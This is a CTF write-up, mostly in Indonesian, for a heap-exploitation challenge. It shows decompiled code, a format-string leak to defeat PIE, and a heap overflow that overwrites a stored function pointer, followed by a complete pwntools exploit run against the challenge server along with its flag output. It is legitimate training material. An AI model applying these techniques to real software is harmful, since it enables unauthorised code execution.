# Writeup: my diary gweh

**Event:** ARA7 Qualification  
**Category:** Binary Exploitation (PWN)  
**Solved by:** demtcsre (Ahmad Rizki Daffaa)  
**Flag:** `ARA7{y3_5hungu4ng_buk4nkah_1ni_myy_ist3r1_gwehhh_4hh}`

---

## Analisis Awal

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec chall
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
Stripped: No
```

**Binary Information:**
- **PIE Enabled** → Alamat binary berubah setiap kali dijalankan; tidak bisa hardcode alamat `get_secret`.
- **NX Enabled** → Tidak bisa jalankan shellcode di stack atau heap.
- **No Canary** → Stack protection off, meskipun target adalah heap.

---

## Fungsi-Fungsi Penting (via Ghidra)

Dari GDB info function, fungsi-fungsi kunci:
```
0x0000000000001209  get_secret
0x0000000000001294  entry_printer
0x00000000000012d2  banner
0x0000000000001306  menu
0x000000000000136c  write_entry
0x00000000000014d7  read_entry
0x0000000000001587  edit_entry
0x000000000000164f  delete_entry
0x0000000000001710  main
```

### `get_secret()` — Target Function

```c
void get_secret(void) {
    char local_58 [72];
    FILE *local_10;

    local_10 = fopen("flag.txt", "r");
    if (local_10 == (FILE *)0x0) {
        puts("flag.txt not found");
        exit(1);
    }
    fgets(local_58, 0x40, local_10);
    puts("bro how do you even discover my wife's secret?");
    puts(local_58);
    fclose(local_10);
    exit(0);
}
```

### `entry_printer()` — Format String Vulnerability

```c
void entry_printer(char *param_1) {
    printf("Content: ");
    printf(param_1);   // <-- VULNERABILITY: No format specifier
    putchar(10);
    return;
}
```

### `write_entry()` — Alokasi Heap

```c
void write_entry(void) {
    // Allocates 0x48 (72) bytes
    pvVar3 = malloc(0x48);
    *(void **)(entries + (long)iVar2 * 8) = pvVar3;
    *(code **)(*(long *)(entries + (long)local_1c[0] * 8) + 0x40) = entry_printer;
    // Stores function pointer at offset +0x40
    fgets(*(char **)(entries + (long)local_1c[0] * 8), 0x40, stdin);
}
```

### `edit_entry()` — Heap Buffer Overflow

```c
void edit_entry(void) {
    // Reads 0x60 (96) bytes into a 0x48-byte allocation
    read(0, *(void **)(entries + (long)local_c * 8), 0x60);
}
```

---

## Identifikasi Vulnerability

1. **Format String Leak (Option 1/2 — Read):** `entry_printer` menggunakan `printf(param_1)` → bisa leak stack addresses untuk bypass PIE.
2. **Heap Buffer Overflow (Option 3 — Edit):** Program mengalokasikan `0x48` bytes tapi `edit_entry` membolehkan menulis `0x60` bytes → bisa overwrite function pointer di `offset +0x40`.
3. **Function Pointer:** Setiap entry menyimpan function pointer (`entry_printer`) di offset `0x40` dari awal chunk.

---

## Langkah-Langkah Eksploitasi

### Step A: Format String Offset

Buat entry dengan konten: `AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p`

Posisi ke-9 (`%9$p`) menghasilkan alamat yang dimulai dengan `0x5...` → ini adalah leak binary.

### Step B: PIE Base Offset (via GDB)

```bash
gdb ./chall
start
vmmap  # Catat base address (e.g., 0x555555554000)
# Trigger leak, misalnya dapat 0x555555555585
# PIE Offset = 0x555555555585 - 0x555555554000 = 0x1585
```

```
PIE Base = leak - 0x1585
```

### Step C: Overflow Offset

Dari disassembly `read_entry`:
```
mov 0x40(%rax), %rax
call *%rax
```

Offset `0x40` = **64 bytes padding** untuk overwrite function pointer.

---

## Alur Eksploitasi

**Phase 1 — Leak:** Kirim `%9$p` → Terima hex address → Hitung PIE Base.

**Phase 2 — Overwrite:** Gunakan `edit_entry`, kirim 64 byte padding + alamat `get_secret`.

```
Payload = [64 bytes junk] + [8 bytes get_secret address]
```

**Phase 3 — Trigger:** Pilih Option 2 (Read Entry) → Program jump ke `get_secret` → Flag tercetak.

---

## Exploit Script

```python
from pwn import *

exe = './chall'
elf = ELF(exe)
context.binary = elf
p = remote('chall-ctf.ara-its.id', 4141)

# Phase 1: Format String Leak
# Write entry with format string payload
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Index (0-9): ', b'0')
p.sendlineafter(b'Entry content: ', b'%9$p')

# Read entry to get leak
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Index: ', b'0')
p.recvuntil(b'Content: ')
leaked = int(p.recvline().strip(), 16)

elf.address = leaked - 0x1585
log.success(f"PIE Base: {hex(elf.address)}")
get_secret = elf.symbols['get_secret']
log.info(f"get_secret: {hex(get_secret)}")

# Phase 2: Heap Buffer Overflow to overwrite function pointer
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Index: ', b'0')
payload = b'A' * 64 + p64(get_secret)
p.sendafter(b'Edit entry: ', payload)

# Phase 3: Trigger
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Index: ', b'0')

p.interactive()
```

**Output:**
```
[+] PIE Base: 0x62c38eb4b000
[*] get_secret: 0x62c38eb4c209
[*] Switching to interactive mode
bro how do you even discover my wife's secret?
ARA7{y3_5hungu4ng_buk4nkah_1ni_myy_ist3r1_gwehhh_4hh}
```

---

## Flag

```
ARA7{y3_5hungu4ng_buk4nkah_1ni_myy_ist3r1_gwehhh_4hh}
```
